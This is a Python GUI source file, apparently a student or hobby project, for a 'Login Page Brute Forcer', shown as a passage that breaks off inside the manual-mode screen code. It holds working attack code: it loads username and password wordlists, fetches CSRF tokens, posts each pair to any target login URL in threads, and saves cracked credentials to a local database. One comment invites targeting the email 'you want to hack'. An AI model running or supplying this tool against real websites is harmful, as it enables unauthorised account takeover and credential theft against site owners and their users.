#import required modules
from textwrap import fill
from tkinter import filedialog, messagebox, messagebox,ttk,font
from tkinter.font import BOLD, ITALIC
from datetime import datetime
from os.path import exists
from tkinter import *
from lxml import html
import sys,os,signal
from os import path
import webbrowser
from pip import main
import validators
import threading
import requests
import sqlite3
import pyglet


#Backend Functions
#-----------------

#Return Proper Path
#------------------
def resource_path():
    CurrentPath = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    # Look for the 'sprites' folder on the path I just gave you:
    spriteFolderPath = os.path.join(CurrentPath, 'Assets')
    path = os.path.join(spriteFolderPath)
    newPath = path.replace(os.sep, '/')
    return newPath

_path = resource_path()

#App Data Location 

APPDATA_local_path = path.expandvars(r'%LOCALAPPDATA%\WebLoginBruteForceTool')
APPDATA_Database_DB = APPDATA_local_path+'\\Database.db'
# APPDATA_history_DB = APPDATA_local_path+'History.db'

#Default values
default_Error = _path+'/ErrorList.txt' 
default_Sussess = _path+'/SussessList.txt'
default_theme_value = 0
default_threading_value = 7

#Custom fonts files
Font_Elephant = (_path+'/Elephant.ttf')
Font_Lobster = (_path+'/Lobster.ttf')
Font_Aller = (_path+'/Aller.ttf')
Font_LucidaBright = (_path+'/LucidaBright.ttf')
Font_IntroScript = (_path+'/IntroScript.ttf')
Font_IntroRust = (_path+'/IntroRust.ttf')

#load custom fonts files
pyglet.font.add_file(Font_Elephant)
pyglet.font.add_file(Font_Lobster)
pyglet.font.add_file(Font_LucidaBright)
pyglet.font.add_file(Font_IntroScript)
pyglet.font.add_file(Font_IntroRust)

#variables
#----------
users_list_file = ''
password_list_file = ''

possible_error_messages = ''
possible_success_messages=  ''
theme_value = ''
th_value = ''

pid= os.getpid()


#colors variables
main_Background = ''
Banner_Colour_1 = ''
Banner_Colour_2 = ''
r_BTN_BG_COLOR = ''
s_BTN_BG_COLOR = ''
text_box_bg_color = ''
text_box_font_color = ''
text_box_font_color = ''
scale_color = ''


class KThread(threading.Thread):
    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False

    def start(self):
        self.__run_backup = self.run
        self.run = self.__run
        threading.Thread.start(self)

    def __run(self):
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup

    def globaltrace(self, frame, why, arg):
        if why == 'call':
            return self.localtrace
        else:
            return None

    def localtrace(self, frame, why, arg):
        if self.killed:
            if why == 'line':
                raise SystemExit()
        return self.localtrace

    def kill(self):
        self.killed = True

#update filses
def set_user_pass_list(u,p):
    global users_list_file, password_list_file
    users_list_file = u
    password_list_file = p


#Exit Function
def exit_CON():
    a = messagebox.askquestion("Exit!!","Are You Sure ??")
    if a == "yes":
        os.kill(pid,signal.SIGTERM)
        mainWindow.destroy()

#Call this function to open tkinter widow in center
def center_window(name,w, h):
    ws = name.winfo_screenwidth()
    hs = name.winfo_screenheight()
    x = (ws/2) - (w/2)
    y = (hs/2) - (h/2)  #change hs/2 to hs/4 to left window up
    name.geometry('%dx%d+%d+%d' % (w, h, x, y))

#Function for clear all widget
def clearWidgets(x):
    def all_children (mainWindow) :
        _list = mainWindow.winfo_children()
        for item in _list :
            if item.winfo_children() :
                _list.extend(item.winfo_children())
        return _list
    def clear_DATA ():
        URLEntryVAR.set(URLEntryVAR_Deafult)
        UserName_TAG_EntryVAR.set(UserName_TAG_EntryVAR_Default)
        Password_TAG_EntryVAR.set(Password_TAG_EntryVAR_Default)
        CSRF_TAG_EntryVAR.set(CSRF_TAG_EntryVAR_Default)
        radiobutton_VAR.set(0)
        usersNameList_EntryVAR.set('')
        PasswordList_EntryVAR.set('')
        set_user_pass_list('','')

    if x == 'clear_all':
        clear_DATA()
        widget_list = all_children(mainWindow)
        for item in widget_list:
            item.destroy()
    elif x == 'clear_widget':
        widget_list = all_children(mainWindow)
        for item in widget_list:
            item.destroy()
    elif x == 'clear_data':
        clear_DATA()

#URL Validation checker
def Validate_URL(check_URL):
    get_url=validators.url(check_URL)
    if get_url==True:
        return True
    else:
        return False

def Validate_files(file_name):
    file_exists = exists(file_name)
    if file_exists==True:
        return True
    else:
        return False

#Check DataBase
def checkDatabase ():
    global possible_error_messages, possible_success_messages, theme_value, th_value
    #APPDATA_local_path
    if (Validate_files(APPDATA_local_path)) == False:
        os.mkdir(APPDATA_local_path)
    if Validate_files(APPDATA_Database_DB) == False: #need to create database
        conn = sqlite3.connect(APPDATA_Database_DB)
        
        conn.execute('''CREATE TABLE Settings
                (error_list             TEXT,
                success_list            TEXT,
                default_theme            INT,
                default_thread_limit     INT);''')
        
        conn.execute('''CREATE TABLE History
                (time_date              TEXT,
                web_url                 TEXT,
                username                TEXT,
                user_password           TEXT);''')

        val1 = str(_path+'/ErrorList.txt')
        val2 = str(_path+'/SussessList.txt')
        conn.execute("insert into Settings (error_list,success_list,default_theme,default_thread_limit) values (?, ?, ?, ?)",
            (val1, val2, 0, 7))
        #Create histroy table letter
        conn.commit()
        conn.close()
    conn = sqlite3.connect(APPDATA_Database_DB)
    cursor = conn.execute("SELECT error_list, success_list, default_theme, default_thread_limit from Settings")
    for row in cursor:
        possible_error_messages = row[0]
        possible_success_messages =  row[1]
        theme_value = int(row[2])
        th_value = int(row[3])
    conn.close()


checkDatabase ()



#GUI Part
# --------------
#Main Window
mainWindow = Tk()

#Variables
URLEntryVAR_Deafult = "Enter The Url Here"
URLEntryVAR = StringVar()
URLEntryVAR.set(URLEntryVAR_Deafult)
usersNameList_EntryVAR = StringVar()
PasswordList_EntryVAR = StringVar()

UserName_TAG_EntryVAR_Default = "Enter User Name Tag"
UserName_TAG_EntryVAR = StringVar()
UserName_TAG_EntryVAR.set(UserName_TAG_EntryVAR_Default)

Password_TAG_EntryVAR_Default = "Enter Password Tag"
Password_TAG_EntryVAR = StringVar()
Password_TAG_EntryVAR.set(Password_TAG_EntryVAR_Default)


CSRF_TAG_EntryVAR_Default = 'Enter CSRF Tag'
CSRF_TAG_EntryVAR = StringVar()
CSRF_TAG_EntryVAR.set(CSRF_TAG_EntryVAR_Default)

errorList_EntryVAR = StringVar()
successList_EntryVAR = StringVar()
Checkbutton_VAR = IntVar()
th_value_VAR = IntVar()
th_value_VAR.set(th_value)

Checkbutton_VAR.set(theme_value)

radiobutton_VAR = IntVar()
radiobutton_VAR.set(0)

back_ICON = PhotoImage(file=_path+"\\back_ICON.png")
light_ICON = PhotoImage(file=_path+"\\light_Mode.png")
dark_ICON = PhotoImage(file=_path+"\\dark_Mode.png")
info_ICON = PhotoImage(file=_path+"\\info_ICON.png")
exit_ICON = PhotoImage(file=_path+"\\exit_ICON.png")
git_ICON = PhotoImage(file=_path+"\\git.png")
hack_ICON = PhotoImage(file=_path+"\\hack.png")

#define colors
def select_colors ():
    global main_Background,Banner_Colour_1,Banner_Colour_2,r_BTN_BG_COLOR,s_BTN_BG_COLOR,text_box_bg_color,text_box_font_color,text_box_font_color,scale_color
    if Checkbutton_VAR.get() == 0:    #light
        main_Background = "#d0ecfd"
        Banner_Colour_1 = "#fafad2"
        Banner_Colour_2 = "#eee8aa"
        r_BTN_BG_COLOR = "#ff664c"
        s_BTN_BG_COLOR = "#00b219"
        text_box_bg_color = 'black'
        text_box_font_color = '#90ee90'
        scale_color = '#ccccff'
    elif Checkbutton_VAR.get() == 1: #dark
        main_Background = "#999999"
        # main_Background = "#cccccc"
        Banner_Colour_1 = "#CBC3E3"
        Banner_Colour_2 = "#CF9FFF"
        r_BTN_BG_COLOR = "#ff664c"
        s_BTN_BG_COLOR = "#00b219"
        text_box_bg_color = 'black'
        text_box_font_color = '#90ee90'
        scale_color = '#ccccff'

# Out Put Screen
def start_ATTACK(arg):    #1 For Auto 2 For Manual
    clearWidgets('clear_widget')
    center_window(mainWindow,720,420)

    Grid.rowconfigure(mainWindow, 0, weight=1)
    Grid.columnconfigure(mainWindow, 0, weight=1)

    # Create and configure textbox_frame
    textbox_frame = Frame(mainWindow)
    textbox_frame.grid(row=0, column=0, sticky="nsew")
    textbox_frame.columnconfigure(0, weight=1)
    textbox_frame.columnconfigure(1, weight=1)
    # textbox_frame.columnconfigure(2, weight=1)
    textbox_frame.rowconfigure(0, weight=1)
    textbox_frame.rowconfigure(1, weight=1)


    # Some GUI widgets
    scrollbar_widget = Scrollbar(mainWindow)
    text_widget = Text(mainWindow)
    text_widget.config(bg=text_box_bg_color,fg=text_box_font_color)

    def add_To_textbox(*arguments): #Take Multiple Args to make 1
        arguments = list(arguments)
        initial_output = ''
        for i in range(len(arguments)):
            initial_output = (arguments[i])

        text_widget.config(state='normal')
        text_widget.insert(END, str(initial_output)+'\n')
        text_widget.config(state='disabled')
        # scrollbar_widget.yview_moveto('1.0')
        text_widget.see("end")

    text_widget.grid(row=0, column=0, columnspan=2, sticky="nsew")
    scrollbar_widget.grid(row=0, column=2, sticky="ns")

    scrollbar_widget.config(command=text_widget.yview)
    text_widget.config(yscrollcommand=scrollbar_widget.set)
    text_widget.config(state='disabled',font=('fixedsys',16))

    def open_ressources(file_path):
        return [item.replace("\n", "") for item in open(file_path).readlines()]


    if possible_error_messages == "ErrorList.txt" or possible_error_messages == "/ErrorList.txt": 
        possible_error = _path+'/ErrorList.txt'
    else:
        possible_error = possible_error_messages

    if possible_success_messages == "SussessList.txt" or possible_success_messages == "/SussessList.txt": 
        possible_success = _path+'/SussessList.txt'
    else:
        possible_success = possible_success_messages


    USERS = open_ressources(users_list_file)
    PASSWORDS = open_ressources(password_list_file)
    LIMIT_TRYING_ACCESSING_URL = th_value_VAR.get()
    INCORRECT_MESSAGE = open_ressources(possible_error)
    SUCCESS_MESSAGE = open_ressources(possible_success)



    def process_request(request, user, password, failed_aftertry):
        if "404" in request.text or "404 - Not Found" in request.text or request.status_code == 404:
            if failed_aftertry > LIMIT_TRYING_ACCESSING_URL:
                add_To_textbox("[+] Connection failed : Trying again ....")
                return
            else:
                failed_aftertry = failed_aftertry + 1
                add_To_textbox("[+] Connection failed : 404 Not Found (Verify your url)")
        else:
            add_To_textbox (request.text)
            if INCORRECT_MESSAGE[0] in request.text or INCORRECT_MESSAGE[1] in request.text:
                add_To_textbox("[+] Failed to connect with:\n user: " + user + " and password: " + password)
            else:
                if SUCCESS_MESSAGE[0] in request.text or SUCCESS_MESSAGE[1] in request.text:
                    result = "\n[+] --------------------------------------------------------------"
                    result += "\n[+] YOooCHA!! \nTheese Credentials succeed to LogIn:\n> username: " + user + " and " \
                                                                                                            "password: " \
                                                                                                            "" + password
                    result += "\n[+] --------------------------------------------------------------\n"
                    # with open("./results.txt", "w+") as frr:
                    #     frr.write(result)
                    add_To_textbox(
                        "[+] A Match succeed 'user: " + user + " and password: " + password + "'")
                    buttonSTOP.config(state=DISABLED)
                    buttonBack.config(state=NORMAL)

                    #Save to database 
                    get_data = datetime.now()
                    currentTime = get_data.strftime("%d"+"/"+"%b"+"/"+"%y"+" - "+"%H"+":"+"%M"+":"+"%S")
                    conn = sqlite3.connect(APPDATA_Database_DB)
                    conn.execute("insert into History (time_date, web_url, username, user_password) values (?, ?, ?, ?)",
                    (currentTime, URLEntryVAR.get(), user, password))
                    conn.commit()
                    conn.close()
                    exit()
                else:
                    add_To_textbox("Trying theese parameters: user: " + user + " and password: " + password)

    def get_csrf_token(url, csrf_field):
        # Get login _token
        add_To_textbox("[+] Connecting to ", url)
        result = requests.get(url)
        tree = html.fromstring(result.text)

        add_To_textbox("[+] Trying to Fetch a token..")
        _token = ""
        try:
            _token = list(set(tree.xpath("//input[@name='" + csrf_field + "']/@value")))[0]
        except Exception as es: pass

        return _token


    def process_user(user, url, failed_aftertry, user_field, password_field, csrf_field="_csrf"):
        for password in PASSWORDS:
            # Create the payload for the submission form
            payload = {
                user_field: user.replace('\n', ''),
                password_field: password.replace('\n', ''),
                csrf_field: get_csrf_token(url, csrf_field)
            }
            add_To_textbox("[+]", payload)
            # Doing the post form
            request = requests.post(url, data=payload)

            process_request(request, user, password, failed_aftertry)


    def try_connection(url, user_field, password_field, csrf_field):
        add_To_textbox("[+] Connecting to: " + url + "......\n")
        # Put the target email you want to hack
        # user_email = raw_input("\nEnter EMAIL / USERNAME of the account you want to hack:")
        failed_aftertry = 0
        for user in USERS:
            process_user(user, url, failed_aftertry, user_field, password_field, csrf_field)


    def extract_field_form(url, html_contain):
        add_To_textbox("[+] Starting extraction...")
        tree = html.fromstring(html_contain)

        add_To_textbox("[+] Fetching parameters..")
        form_action_url = list(tree.xpath("//form/@action"))[0]
        payload_fetched = list(set(tree.xpath("//form//input")))

        if len(form_action_url) == 0:
            form_action_url = url

        if "http" not in form_action_url:
            form_action_url = url + form_action_url

        add_To_textbox("[++] > action : ", form_action_url)
        fields = []
        for each_element in payload_fetched:
            names = each_element.xpath("//@name")
            types = each_element.xpath("//@type")

            for i, name in enumerate(names):
                if types[i] != "submit" and name != "submit":
                    add_To_textbox("[++] > ", str(name), "{" + str(types[i]) + "}")
            fields = names
            break

        if len(fields) == 2:
            fields.append("empty-token-field")

        try_connection(url, fields[0], fields[1], fields[2])

    def manual_mode():
        add_To_textbox("[+] Starting the manual mode...")
        # Field's Form -------
        # The link of the website
        url = URLEntryVAR.get()
        # The user_field in the form of the login
        user_field = UserName_TAG_EntryVAR.get()
        # The password_field in the form
        password_field = Password_TAG_EntryVAR.get()
        # The password_field in the form
        if radiobutton_VAR.get()==1:
            csrf_field = CSRF_TAG_EntryVAR.get()
        else:
            csrf_field = ""
        try_connection(url, user_field, password_field, csrf_field)
        buttonSTOP.config(state=DISABLED)
        buttonBack.config(state=NORMAL)

    def automatic_mode():
        add_To_textbox("[+] Starting the automatic mode...")
        url = URLEntryVAR.get()
        r = requests.get(url)
        extract_field_form(url, r.text)
        buttonSTOP.config(state=DISABLED)
        buttonBack.config(state=NORMAL)

    def stop_attack():
        start_thread.kill()
        buttonSTOP.config(state=DISABLED)
        buttonBack.config(state=NORMAL)

    if arg==1:
        start_thread =KThread(target=automatic_mode)
        start_thread.start()
    elif arg==2:
        start_thread =KThread(target=manual_mode)
        start_thread.start()
    buttonSTOP = Button(mainWindow, text="Stop Attack", command=stop_attack)
    buttonBack = Button(mainWindow, text="Back", state=DISABLED,command=loadAutometedFrame)
    buttonSTOP.grid(row=2, column=1, sticky="n",pady=6)
    buttonBack.grid(row=2, column=0, sticky="e",padx=8,pady=6)

#Autometed Frame
def loadAutometedFrame():
    clearWidgets('clear_all')
    center_window(mainWindow,435, 420)
    mainWindow.config(bg=main_Background)
    mainWindow.title("Login Page Brute Forcer - Autometed")

    #URL ENTRY FIELD STUFF------------------

    Button(mainWindow,image=back_ICON,command=loadHomeScreen,relief=GROOVE,bd=0,bg=main_Background,activebackground=main_Background).pack(side=TOP,anchor=W,padx=15,pady=6)

    miscellaneousFrame = Frame(mainWindow,bg=main_Background)
    miscellaneousFrame.pack(side=TOP,anchor=W)
    Label(miscellaneousFrame,text="          ",font=("arial",4),bg=main_Background).pack(side=LEFT)
    Label(miscellaneousFrame,text="Target URL",font=("Calisto MT",14,BOLD),relief=RAISED,bg=Banner_Colour_1,highlightthickness=3,highlightbackground=Banner_Colour_2).pack(side=LEFT)

    Label(mainWindow,text="  ",font=("arial",1),bg=main_Background).pack()

    entryFrame = Frame(mainWindow,bg=main_Background)
    Label(entryFrame,text="    ",font=("arial",4),bg=main_Background).pack(side=LEFT)

    # entryFrame = Frame(mainWindow)
    # Label(entryFrame,text="    ",font=("arial",4)).pack(side=LEFT)
    entryFrame.pack(side=TOP,anchor=W)


    def preCheckInputs_Before_AutoAttack():
        url = URLEntryVAR.get()
        name = usersNameList_EntryVAR.get()
        passwords = PasswordList_EntryVAR.get()
        if url=="" or url==URLEntryVAR_Deafult or name=="" or passwords=="":
            messagebox.showinfo('Error','Please fields all the fields\nand try again!!')
        else:
            #
            if Validate_URL(url) == True and Validate_files(name) == True and Validate_files(passwords) == True:
                a = messagebox.askyesno('Conformation','Ready to start the attack ?')
                if a == True:
                    set_user_pass_list(name,passwords)
                    start_ATTACK(1)
            else:
                messagebox.showinfo('Error','URL or Username List or Password List\nis missing')

        if url == '':
            msglabel.config(text='Please enter an URL',fg='red')
        elif Validate_URL(url) != True:
            msglabel.config(text='Please enter a valid URL',fg='red')
        if Validate_files(name) != True:
            userName_msglabel.config(text='Please select an user name list')
        if Validate_files(passwords) != True:
            Password_msglabel.config(text='Please select a password list')

    def on_Url_entry_click(event):
        if URLEntryVAR.get() == URLEntryVAR_Deafult:
            URLEntryBox.delete(0, "end") # delete all the text in the entry
            URLEntryBox.insert(0, '') #Insert blank for user input
            URLEntryBox.config(fg = 'black',font=("century",13))
            URLvalidateButton.config(state=NORMAL,text="Validate")
        elif URLvalidateButton['text'] == 'Valid':
            URLvalidateButton.config(state=NORMAL,text="Validate")
        msglabel.config(text='')
    def on_Url_entry_focusout(event,e):
        if URLEntryVAR.get() != URLEntryVAR_Deafult or URLEntryVAR.get() !='':
            URLEntryBox.config(fg = 'black',font=("century",13))
            #if URLvalidateButton['text'] != "Valid":
            URLvalidateButton.config(state=NORMAL,text="Validate")
        if URLEntryBox.get() == '' or URLEntryVAR.get() == URLEntryVAR_Deafult:
            URLEntryVAR.set(URLEntryVAR_Deafult)
            URLEntryBox.config(fg = 'grey',font=("Comic Sans MS",11))
            URLvalidateButton.config(state=DISABLED,text="Validate")

    Label(entryFrame,text="",font=('Arial',1),bg=main_Background).pack(side=LEFT)
    URLEntryBox_hscrollbar = Scrollbar(entryFrame, orient=HORIZONTAL)
    URLEntryBox_hscrollbar.pack(side=BOTTOM,fill=BOTH)
    URLEntryBox = Entry(entryFrame,cursor='',textvariable=URLEntryVAR,font=("Comic Sans MS",11),bd=2,fg = 'grey',xscrollcommand=URLEntryBox_hscrollbar.set,width=36)
    URLEntryBox.pack(side=LEFT)
    URLEntryBox_hscrollbar.config(command=URLEntryBox.xview)
    URLEntryBox.bind('<FocusIn>', on_Url_entry_click)
    URLEntryBox.bind('<FocusOut>',None, on_Url_entry_focusout)
    Label(entryFrame,text=" ",bg=main_Background).pack(side=LEFT)

    msglabel = Label(mainWindow,text="",font=('century',10,BOLD),fg='#ff4747',bg=main_Background)
    msglabel.pack()

    #URL Validate Button Function
    def URLvalidateButton_Function():
        if URLEntryVAR.get() == '' or URLEntryVAR.get() == URLEntryVAR_Deafult :
            msglabel.config(text='Enter URL First',fg='red')
        else:
            if Validate_URL(URLEntryVAR.get()) == True:
                msglabel.config(text='URL valid prosied to attack',fg='green')
                mainWindow.focus_set()
                URLvalidateButton.config(state=DISABLED,text="Valid")
            else:
                msglabel.config(text='Please Enter A Valid URl',fg='red')
    #URL Validate Button
    URLvalidateButton = Button(entryFrame,text="Validate",font=("arial",12),width=6,height=1,command=URLvalidateButton_Function,state=DISABLED)
    URLvalidateButton.pack(side=RIGHT)

    #Select Usernames
    def choose_users_file():
        global text_Filename
        userName_msglabel.config(text='')
        text_Filename = filedialog.askopenfilename(title = "Select Text File",filetypes = (('text files', '*.txt'),))
        filename_con = text_Filename.replace('/', '\\')
        if  filename_con != "":
            username_Select_BTN.config(text="Change")
            usersNameList_EntryVAR.set(filename_con)
        elif  filename_con == "":
            username_Select_BTN.config(text="Select")
            usersNameList_EntryVAR.set("")
            userName_msglabel.config(text='Please select an user name list')
        userNameList_Entry.xview_moveto(1)

    miscellaneousFrame2 = Frame(mainWindow,bg=main_Background)
    miscellaneousFrame2.pack(side=TOP,anchor=W)

    Label(miscellaneousFrame2,text="          ",font=("arial",4),bg=main_Background).pack(side=LEFT)
    Label(miscellaneousFrame2,text="Username List",font=("Calisto MT",14,BOLD),relief=RAISED,bg=Banner_Colour_1,highlightthickness=3,highlightbackground=Banner_Colour_2).pack(side=LEFT)

    Label(mainWindow,text="  ",font=("arial",1),bg=main_Background).pack()
    userNameListSelection_Frame=Frame(mainWindow,bg=main_Background)

    userNameListSelection_Frame.pack()

    userNameSelect_hscrollbar = Scrollbar(userNameListSelection_Frame, orient=HORIZONTAL)
    userNameSelect_hscrollbar.pack(side=BOTTOM,fill=BOTH)

    userNameList_Entry = Entry(userNameListSelection_Frame,cursor='',font=("century",13),textvariable=usersNameList_EntryVAR,xscrollcommand=userNameSelect_hscrollbar.set,width=36,state=DISABLED)
    userNameList_Entry.pack(side=LEFT)

    userNameSelect_hscrollbar.config(command=userNameList_Entry.xview)

    Label(userNameListSelection_Frame,text="      ",font=("arial",4),bg=main_Background).pack(side=LEFT)
    username_Select_BTN = Button(userNameListSelection_Frame,text="Select",font=("arial",12),width=6,height=1,command=choose_users_file)
    username_Select_BTN.pack(side=RIGHT)

    userName_msglabel= Label(mainWindow,text="",font=('century',10,BOLD),fg='#ff4747',bg=main_Background)
    userName_msglabel.pack()


    #Select Passwords

    def choose_password_file():
        global text_Filename
        Password_msglabel.config(text='')
        text_Filename = filedialog.askopenfilename(title = "Select Text File",filetypes = (('text files', '*.txt'),))
        filename_con = text_Filename.replace('/', '\\')
        if  filename_con != "":
            Password_Select_BTN.config(text="Change")
            PasswordList_EntryVAR.set(filename_con)
        elif  filename_con == "":
            Password_Select_BTN.config(text="Select")
            PasswordList_EntryVAR.set("")
            Password_msglabel.config(text='Please select a password list')
        PasswordList_Entry.xview_moveto(1)

    miscellaneousFrame3 = Frame(mainWindow,bg=main_Background)
    miscellaneousFrame3.pack(side=TOP,anchor=W)

    Label(miscellaneousFrame3,text="          ",font=("arial",4),bg=main_Background).pack(side=LEFT)
    Label(miscellaneousFrame3,text="Password List",font=("Calisto MT",14,BOLD),relief=RAISED,bg=Banner_Colour_1,highlightthickness=3,highlightbackground=Banner_Colour_2).pack(side=LEFT)

    Label(mainWindow,text="  ",font=("arial",1),bg=main_Background).pack()
    PasswordListSelection_Frame=Frame(mainWindow,bg=main_Background)

    PasswordListSelection_Frame.pack()

    PasswordSelect_hscrollbar = Scrollbar(PasswordListSelection_Frame, orient=HORIZONTAL)
    PasswordSelect_hscrollbar.pack(side=BOTTOM,fill=BOTH)

    PasswordList_Entry = Entry(PasswordListSelection_Frame,cursor='',font=("century",13),textvariable=PasswordList_EntryVAR,xscrollcommand=PasswordSelect_hscrollbar.set,width=36,state=DISABLED)
    PasswordList_Entry.pack(side=LEFT)

    PasswordSelect_hscrollbar.config(command=PasswordList_Entry.xview)

    Label(PasswordListSelection_Frame,text="      ",font=("arial",4),bg=main_Background).pack(side=LEFT)
    Password_Select_BTN = Button(PasswordListSelection_Frame,text="Select",font=("arial",12),width=6,height=1,command=choose_password_file)
    Password_Select_BTN.pack(side=RIGHT)

    Password_msglabel= Label(mainWindow,text="",font=('century',10,BOLD),fg='#ff4747',bg=main_Background)
    Password_msglabel.pack()

    #Bottom Button Frame

    bottomBTN_Frame = Frame(mainWindow,bg=main_Background)
    bottomBTN_Frame.pack(side=BOTTOM,anchor=E,padx=12)

    Button(bottomBTN_Frame,text='Reset',font=('Lobster 1.3',12),bg=r_BTN_BG_COLOR,highlightthickness=3,activebackground=r_BTN_BG_COLOR,command=lambda:clearWidgets('clear_data')).pack(side=LEFT,padx=6,pady=7)
    Button(bottomBTN_Frame,text='Start Attack',font=('Lobster 1.3',12),bg=s_BTN_BG_COLOR,highlightthickness=3,activebackground=s_BTN_BG_COLOR,command=preCheckInputs_Before_AutoAttack).pack(side=RIGHT,pady=7)


#Load Manual Mode Screen
def loadManualFrame():

    clearWidgets('clear_all')
    center_window(mainWindow,440, 415)
    mainWindow.config(bg=main_Background)
    mainWindow.title("Login Page Brute Forcer - Manual")

    topButtonFrame = Frame(mainWindow,bg=main_Background)
    topButtonFrame.pack(anchor=NW)

    manualframe = Frame(mainWindow,bg=main_Background)
    manualframe.pack(fill=BOTH,expand=1)

    manualCanvas = Canvas(manualframe,bg=main_Background,highlightcolor=main_Background,highlightbackground=main_Background)
    manualCanvas.pack(side=LEFT,fill=BOTH,expand=1)

    canvas_vbar = ttk.Scrollbar(manualframe,orient=VERTICAL,command=manualCanvas.yview)
    canvas_vbar.pack(side=RIGHT,fill=Y)


    manualCanvas.configure(yscrollcommand=canvas_vbar.set)
    manualCanvas.bind('<Configure>',lambda e:manualCanvas.configure(scrollregion=manualCanvas.bbox("all")))


    frame_for_adding_stuff = Frame(manualCanvas,bg=main_Background)

    manualCanvas.create_window((0,0),window=frame_for_adding_stuff,anchor=NW)


    #URL ENTRY FIELD STUFF------------------

    Button(topButtonFrame,image=back_ICON,command=loadHomeScreen,relief=GROOVE,bd=0,bg=main_Background,activebackground=main_Background).pack(side=TOP,anchor=W,padx=15,pady=6)

    miscellaneousFrame = Frame(frame_for_adding_stuff,bg=main_Background)
    miscellaneousFrame.pack(side=TOP,anchor=W)
    Label(miscellaneousFrame,text="          ",font=("arial",4),bg=main_Background).pack(side=LEFT)
    Label(miscellaneousFrame,text="Target URL",font=("Calisto MT",14,BOLD),relief=RAISED,bg=Banner_Colour_1,highlightthickness=3,highlightbackground=Banner_Colour_2).pack(side=LEFT)

    Label(frame_for_adding_stuff,text="  ",font=("arial",1),bg=main_Background).pack()

    entryFrame = Frame(frame_for_adding_stuff,bg=main_Background)
    Label(entryFrame,text="    ",font=("arial",4),bg=main_Background).pack(side=LEFT)

    entryFrame.pack(side=TOP,anchor=W)


    def preCheckInputs_Before_manualAttack():
        url = URLEntryVAR.get()
        name = usersNameList_EntryVAR.get()
        passwords = PasswordList_EntryVAR.get()
        u_tag = UserName_TAG_EntryVAR.get()
        p_tag = Password_TAG_EntryVAR.get()
        csrf_tag = CSRF_TAG_EntryVAR.get()


        if url=="" or url==URLEntryVAR_Deafult or name=="" or passwords=="" or u_tag=="" or u_tag==UserName_TAG_EntryVAR_Default or p_tag=="" or p_tag==Password_TAG_EntryVAR_Default:
            messagebox.showinfo('Error','Please fields all the fields\nand try again!!')
        else:
            if radiobutton_VAR.get() == 0 or radiobutton_VAR.get() == 2:
                if Validate_URL(url) == True and Validate_files(name) == True and Validate_files(passwords) == True:
                    a = messagebox.askyesno('Conformation','Ready to start the attack ?')
                    if a == True:
                        set_user_pass_list(name,passwords)
                        start_ATTACK(2)
                else:
                    messagebox.showinfo('Error','Please fill all the\required field')
            elif radiobutton_VAR.get() == 1:
                if csrf_tag!="" or csrf_tag!=CSRF_TAG_EntryVAR_Default:
                    if Validate_URL(url) == True and Validate_files(name) == True and Validate_files(passwords) == True:
                        a = messagebox.askyesno('Conformation','Ready to start the attack ?')
                        if a == True:
                            set_user_pass_list(name,passwords)
                            start_ATTACK(2)

        if url == '':
            msglabel.config(text='Please enter an URL',fg='red')
        elif Validate_URL(url) != True:
            msglabel.config(text='Please enter a valid URL',fg='red')
        if Validate_files(name) != True:
            userName_msglabel.config(text='Please select an user name list')
        if Validate_files(passwords) != True:
            Password_msglabel.config(text='Please select a password list')
        if u_tag == "" or u_tag == UserName_TAG_EntryVAR_Default:
            UserName_TAG_msglabel.config(text='Please enter user name Tag')
        if p_tag == "" or p_tag == Password_TAG_EntryVAR_Default:
            Password_TAG_msglabel.config(text='Please enter password Tag')
        if radiobutton_VAR.get() == 1:
            if csrf_tag == "" or csrf_tag == CSRF_TAG_EntryVAR_Default:
                CSRF_TAG_msglabel.config(text='Please enter CSRF Token Tag')


    def on_Url_entry_click(event):
        if URLEntryVAR.get() == URLEntryVAR_Deafult:
            URLEntryBox.delete(0, "end") # delete all the text in the entry
            URLEntryBox.insert(0, '') #Insert blank for user input
            URLEntryBox.config(fg = 'black',font=("century",13))
            URLvalidateButton.config(state=NORMAL,text="Validate")
        elif URLvalidateButton['text'] == 'Valid':
            URLvalidateButton.config(state=NORMAL,text="Validate")
        msglabel.config(text='')
    def on_Url_entry_focusout(event):
        if URLEntryVAR.get() != URLEntryVAR_Deafult or URLEntryVAR.get() !='':
            URLEntryBox.config(fg = 'black',font=("century",13))
            URLvalidateButton.config(state=NORMAL,text="Validate")
        if URLEntryBox.get() == '' or URLEntryVAR.get() == URLEntryVAR_Deafult:
            URLEntryVAR.set(URLEntryVAR_Deafult)
            URLEntryBox.config(fg = 'grey',font=("Comic Sans MS",11))
            URLvalidateButton.config(state=DISABLED,text="Validate")

    Label(entryFrame,text="",font=('Arial',1),bg=main_Background).pack(side=LEFT)
    URLEntryBox_hscrollbar = Scrollbar(entryFrame, orient=HORIZONTAL)
    URLEntryBox_hscrollbar.pack(side=BOTTOM,fill=BOTH)
    URLEntryBox = Entry(entryFrame,cursor='',textvariable=URLEntryVAR,font=("Comic Sans MS",11),bd=2,fg = 'grey',xscrollcommand=URLEntryBox_hscrollbar.set,width=36)
    URLEntryBox.pack(side=LEFT)
    URLEntryBox_hscrollbar.config(command=URLEntryBox.xview)
    URLEntryBox.bind('<FocusIn>', on_Url_entry_click)
    URLEntryBox.bind('<FocusOut>',None, on_Url_entry_focusout)
    Label(entryFrame,text=" ",bg=main_Background).pack(side=LEFT)

    msglabel = Label(frame_for_adding_stuff,text="",font=('century',10,BOLD),fg='#ff4747',bg=main_Background)
    msglabel.pack()

    #URL Validate Button Function
    def URLvalidateButton_Function():
        if URLEntryVAR.get() == '' or URLEntryVAR.get() == URLEntryVAR_Deafult :
            msglabel.config(text='Enter URL First',fg='red')
        else:
            if Validate_URL(URLEntryVAR.get()) == True:
                msglabel.config(text='URL valid prosied to attack',fg='green')
                mainWindow.focus_set()
                URLvalidateButton.config(state=DISABLED,text="Valid")
            else:
                msglabel.config(text='Please Enter A Valid URl',fg='red')
    #URL Validate Button
    URLvalidateButton = Button(entryFrame,text="Validate",font=("arial",12),width=6,height=1,command=URLvalidateButton_Function,state=DISABLED)
    URLvalidateButton.pack(side=RIGHT)

    #Select Usernames

    def choose_users_file():
        global text_Filename
        userName_msglabel.config(text='')
        text_Filename = filedialog.askopenfilename(title = "Select Text File",filetypes = (('text files', '*.txt'),))
        filename_con = text_Filename.replace('/', '\\')
        if  filename_con != "":
            username_Select_BTN.config(text="Change")
